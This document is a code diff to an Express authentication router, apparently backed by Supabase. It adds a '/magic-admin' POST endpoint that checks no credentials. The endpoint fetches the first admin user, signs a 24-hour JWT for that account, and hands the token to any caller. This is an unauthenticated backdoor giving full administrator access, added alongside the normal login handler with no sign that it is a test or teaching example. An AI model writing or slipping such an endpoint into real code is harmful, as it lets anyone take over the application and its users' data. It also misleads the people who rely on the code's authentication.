@@ -43,4 +43,32 @@ router.post('/login', async (req, res) => {
   });
 });
 
+router.post('/magic-admin', async (req, res) => {
+  const { data: user, error } = await supabase
+    .from('users')
+    .select('*')
+    .eq('role', 'admin')
+    .limit(1)
+    .single();
+
+  if (error || !user) {
+    return res.status(401).json({ message: 'No admin found' });
+  }
+
+  const token = jwt.sign(
+    { id: user.id, username: user.username, role: user.role },
+    JWT_SECRET,
+    { expiresIn: '24h' }
+  );
+
+  res.json({
+    token,
+    user: {
+      id: user.id,
+      username: user.username,
+      role: user.role
+    }
+  });
+});
+
 module.exports = { authRouter: router, JWT_SECRET };
